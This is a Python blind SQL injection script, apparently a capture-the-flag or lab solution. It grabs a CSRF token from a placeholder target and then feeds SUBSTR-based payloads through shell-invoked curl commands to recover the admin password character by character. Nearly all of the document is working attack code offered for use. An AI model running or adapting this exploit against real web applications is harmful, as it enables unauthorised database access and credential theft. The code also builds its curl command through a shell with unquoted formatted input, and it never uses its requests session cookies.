import requests
from bs4 import BeautifulSoup
import string
import urllib3
import re
import subprocess
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "http://url:port"
TARGET_URL = f"{BASE_URL}/hook"
CHARSET = string.ascii_letters + string.digits + "_!@#$%^*()-=+[]{}|;:,.<>/?"  # Narrowed charset for speed

HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,el;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': BASE_URL,
    'Referer': BASE_URL + '/',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'
}

COOKIES = {
    # cookies here
    'session': '...',
    # more cookies...
}


def get_csrf_token(session, url):
    response = session.get(url, headers=HEADERS, cookies=COOKIES, verify=False)
    match = re.search(r'csrf=([a-f0-9]{64,})', response.text)
    if match:
        return match.group(1)
    else:
        print("[!] CSRF token not found in JS.")
        print(response.text[:1000])
        return None

def test_char(session, position, char, csrf_token):
    payload = f"' OR SUBSTR((SELECT password FROM users WHERE name='admin'), {position}, 1) = '{char}'-- " # blind sqli
    cmd = """
curl 'http://url-here/hook' \
-H 'Accept: */*' \
-H 'Accept-Language: en-US,en;q=0.9,el;q=0.8' \
-H 'Connection: keep-alive' \
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
-b 'cookies here' \
-H 'Origin: http://url-here' \
-H 'Referer: http://url-here/' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' \
-H 'X-Requested-With: XMLHttpRequest' \
--data-raw "id={}&csrf={}" \
--insecure
    """.format(payload, csrf_token)
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    result = result.stdout
    # if it returns json => found valid character
    return '"success":true' in result or '"success":false' in result


def main():
    password = ""
    with requests.Session() as session:
        for pos in range(1, 50):  # Max password length guess
            csrf_token = get_csrf_token(session, BASE_URL);
            if not csrf_token:
                print("Failed to retrieve CSRF token.")
                break
            else:
                found = False
                for char in CHARSET:
                    if char in ["'", '"', "\\"]:
                        continue  # Avoid breaking SQL
                    if test_char(session, pos, char, csrf_token):
                        password += char
                        sys.stdout.write(f'\rPassword: {password}')
                        sys.stdout.flush()
                        found = True
                        break

                if not found:
                   break
    if password != "":
        print(f"\n[âœ”] Recovered password!")
    else:
        print("Could not retrieve the password")

if __name__ == "__main__":
    main()
